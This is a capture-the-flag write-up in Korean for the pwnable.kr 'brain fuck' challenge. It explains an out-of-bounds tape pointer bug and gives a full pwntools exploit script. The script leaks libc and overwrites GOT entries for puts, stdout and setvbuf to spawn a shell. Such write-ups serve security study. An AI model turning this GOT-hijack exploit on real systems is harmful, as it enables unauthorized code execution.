# [pwnable.kr] brain fuck

> I made a simple brain-fuck language emulation program written in C. 
> The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
> Find a bug and exploit it to get a shell. 
>
> Download : http://pwnable.kr/bin/bf
> Download : http://pwnable.kr/bin/bf_libc.so
>
> Running at : nc pwnable.kr 9001

## Bug

![image](https://github.com/user-attachments/assets/7ea8e1d0-5f1b-4f69-81cf-84cb700e64b2)

`<`와 `>` 연산을 처리할 때 `p`가 `tape`의 범위를 벗어나지 않는지 검사하는 과정이 없어서 OOB가 발생할 수 있다.

![image](https://github.com/user-attachments/assets/9ab8fedf-1d72-4da9-8149-d342cb270f03)

`tape`의 앞쪽에 있는 `p` 포인터를 임의의 주소로 덮으면 그 주소에 접근해서 값을 읽거나 쓸 수 있다.

## Exploit

GOT를 oneshot gadget으로 덮는 게 가장 간단한 방법이지만, 조건이 맞는 oneshot gadget이 없다.

![image](https://github.com/user-attachments/assets/8d0fb008-3d2c-4802-9da7-97b57c7e868f)

`main()`에서 `setvbuf(stdout, 0, 2, 0)`을 호출할 때, `0x804a060`(`stdout`의 GOT)에 저장된 값을 가져와서 `setvbuf()`의 첫 번째 인자로 전달한다. `stdout`의 GOT를 `"/bin/sh"`의 주소로 덮고 `setvbuf()`의 GOT를 `system()`의 주소로 덮으면, 이 코드는 `system("/bin/sh")`을 호출하는 코드가 된다.

![image](https://github.com/user-attachments/assets/22150f89-c7b6-48c3-9d5b-7a59388060a5)

그리고 나서 `puts()`의 GOT를 `main+35`로 덮어서 돌아가면 shell을 획득할 수 있다.

```python
# ex.py

from pwn import *

r = remote("pwnable.kr", 9001)

tape = 0x804A0A0  # tape
main = 0x8048671  # main()
puts_got = 0x804A018  # GOT of puts()
stdout_got = 0x804A060  # GOT of stdout
setvbuf_got = 0x804A028  # GOT of setvbuf()

puts_offset = 0x5FCB0  # offset of puts() from libc base
system_offset = 0x3ADB0  # offset of system() from libc base
binsh_offset = 0x15BB2B  # offset of "/bin/sh" from libc base

# leak libc
payload = b"<" * (tape - puts_got)
payload += b".>.>.>."

# overwrite GOT of puts() with main+35
payload += b"<<<"
payload += b",>,>,>,"

# overwrite GOT of stdout with "/bin/sh"
payload += b"<<<"
payload += b">" * (stdout_got - puts_got)
payload += b",>,>,>,"

# overwrite GOT of setvbuf() with system()
payload += b"<<<"
payload += b"<" * (stdout_got - setvbuf_got)
payload += b",>,>,>,"

# call puts() => main+35
payload += b"["

r.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload)

# leak libc
puts = u32(r.recvn(4))  # puts()
libc = puts - puts_offset  # libc base
log.info("libc base: " + hex(libc))
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"

# overwrite GOT of puts() with main+35
r.send(p32(main + 35))

# overwrite GOT of stdout with "/bin/sh"
r.send(p32(binsh))

# overwrite GOT of setvbuf() with system()
r.send(p32(system))

r.interactive()
```

![image](https://github.com/user-attachments/assets/04f883a3-b947-4462-8264-5936ce8b922c)
